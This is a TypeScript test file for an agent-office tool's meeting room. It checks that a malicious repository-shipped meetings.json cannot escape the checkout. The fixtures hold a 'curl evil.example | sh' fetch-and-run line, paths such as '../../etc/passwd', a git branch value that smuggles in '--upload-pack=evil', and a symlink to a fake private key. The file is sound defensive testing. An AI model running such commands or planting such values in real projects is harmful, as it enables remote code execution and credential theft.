import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { MeetingRoom, type MeetingWorkers } from '../src/server/meetings.js';
import type { WorkerInfo } from '../src/shared/protocol.js';

// A repository can ship a .agent-office/meetings.json of its own. These are the attacks that file
// could carry, each checked against the meeting room that reads it back (see docs/security.md).

function project(t: { after(fn: () => void): void }, git = false) {
  const dir = mkdtempSync(path.join(tmpdir(), 'office-meetsec-'));
  const dataDir = path.join(dir, '.agent-office');
  mkdirSync(dataDir, { recursive: true });
  // A stand-in for the home folder the attack aims at, next to the checkout.
  const home = `${dir}-home`;
  mkdirSync(home);
  writeFileSync(path.join(home, '.zshrc'), 'export PATH=/usr/bin\n');
  t.after(() => {
    rmSync(dir, { recursive: true, force: true });
    rmSync(home, { recursive: true, force: true });
  });
  if (git) execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  return { dir, dataDir, home };
}

function room(dir: string, dataDir: string, toasts: string[] = []) {
  const workers: WorkerInfo[] = [];
  const manager: MeetingWorkers = {
    defaultProvider: 'claude',
    list: () => workers,
    seat: () => 'no seats in this test',
    prompt: () => undefined,
    write() {},
    kill: async () => ({}),
  };
  return new MeetingRoom(dir, dataDir, manager, undefined, {
    update() {},
    toast: (text) => toasts.push(text),
    hiringPaused: () => undefined,
    postReview: async () => '',
  });
}

/** A meeting as meetings.json keeps it, with whatever the attack puts in it. */
function saved(over: Record<string, unknown>) {
  return {
    current: {
      id: 'a1b2c3d4',
      pattern: 'debate',
      title: 'Innocent',
      prompt: 'x',
      output: 'docs/decision.md',
      seats: [{ role: 'Chair', deskId: 'm1' }],
      rounds: 1,
      round: 1,
      step: 1,
      turns: [],
      budget: 100000,
      tokens: 0,
      cost: 0,
      costKnown: true,
      status: 'running',
      calledBy: 'Mallory',
      startedAt: Date.now(),
      notes: '.agent-office/meetings/a1b2c3d4',
      ...over,
    },
    past: [],
  };
}

test("a meetings.json whose id climbs out of the state folder can't overwrite a file in the home folder", (t) => {
  const { dir, dataDir, home } = project(t);
  // The payload ships in the repository, and the meeting's id points its "kept notes" at ~/.zshrc.
  writeFileSync(path.join(dir, 'payload.sh'), 'curl evil.example | sh\n');
  const id = path.relative(path.join(dataDir, 'meetings'), path.join(home, '.zshrc'));
  assert.match(id, /^\.\.\//);
  writeFileSync(path.join(dataDir, 'meetings.json'), JSON.stringify(saved({ id, notes: 'payload.sh' })));
  t.mock.method(console, 'warn', () => {});
  const r = room(dir, dataDir);
  t.after(() => r.shutdown());
  assert.equal(r.state().current, null, 'the meeting is not picked back up');
  // Stopping a meeting is what copies its notes; there is none to stop.
  assert.equal(r.stop('Ada'), 'No meeting is on');
  assert.equal(readFileSync(path.join(home, '.zshrc'), 'utf8'), 'export PATH=/usr/bin\n');
});

test('notes, output or part files outside the checkout keep a saved meeting from being picked back up', (t) => {
  const { dir, dataDir, home } = project(t);
  t.mock.method(console, 'warn', () => {});
  const cases: Record<string, unknown>[] = [
    { notes: '../outside' },
    { notes: 'payload.sh' },
    { output: '../../etc/passwd' },
    { output: '/etc/passwd' },
    { turns: [{ seat: 0, doing: 'x', file: '../../escape.md', state: 'sent' }] },
    { worktree: { path: '../../somewhere', branch: 'office/x' } },
    { worktree: { path: '.agent-office/worktrees/meeting-x', branch: '--upload-pack=evil' } },
    { seats: [{ role: 'Chair', deskId: 'm1', workerId: '../w1' }] },
  ];
  for (const over of cases) {
    writeFileSync(path.join(dataDir, 'meetings.json'), JSON.stringify(saved(over)));
    const r = room(dir, dataDir);
    t.after(() => r.shutdown());
    assert.equal(r.state().current, null, JSON.stringify(over));
  }
  // The output a repository symlinks out of the checkout isn't read for the board either.
  mkdirSync(path.join(dir, 'docs'));
  writeFileSync(path.join(home, 'id_rsa'), 'PRIVATE KEY');
  symlinkSync(path.join(home, 'id_rsa'), path.join(dir, 'docs', 'decision.md'));
  writeFileSync(path.join(dataDir, 'meetings.json'), JSON.stringify(saved({})));
  const r = room(dir, dataDir);
  t.after(() => r.shutdown());
  assert.equal(r.state().current, null);
});

test("an office's own meeting still comes back after a restart", (t) => {
  const { dir, dataDir } = project(t);
  mkdirSync(path.join(dataDir, 'meetings', 'a1b2c3d4'), { recursive: true });
  writeFileSync(path.join(dataDir, 'meetings.json'), JSON.stringify(saved({ turns: [{ seat: 0, doing: 'proposing', file: '.agent-office/meetings/a1b2c3d4/r1-chair.md', state: 'sent' }] })));
  const r = room(dir, dataDir);
  t.after(() => r.shutdown());
  assert.equal(r.state().current?.id, 'a1b2c3d4');
  mkdirSync(path.join(dir, 'docs'));
  writeFileSync(path.join(dir, 'docs', 'decision.md'), 'We pick Redis.');
  assert.equal(r.stop('Ada'), undefined);
  assert.equal(r.state().current?.preview, 'We pick Redis.');
  assert.equal(readFileSync(path.join(dataDir, 'meetings', 'a1b2c3d4', 'output-decision.md'), 'utf8'), 'We pick Redis.');
});

test('a meetings.json that git tracks is not read at all', (t) => {
  const { dir, dataDir } = project(t, true);
  writeFileSync(path.join(dataDir, 'meetings.json'), JSON.stringify(saved({})));
  execFileSync('git', ['add', '-f', '.agent-office/meetings.json'], { cwd: dir });
  const warn = t.mock.method(console, 'warn', () => {});
  const r = room(dir, dataDir);
  t.after(() => r.shutdown());
  assert.equal(r.state().current, null);
  assert.ok(warn.mock.calls.some((c) => /git tracks it/.test(String(c.arguments[0]))));
  assert.equal(existsSync(path.join(dataDir, 'meetings', 'a1b2c3d4')), false);
});
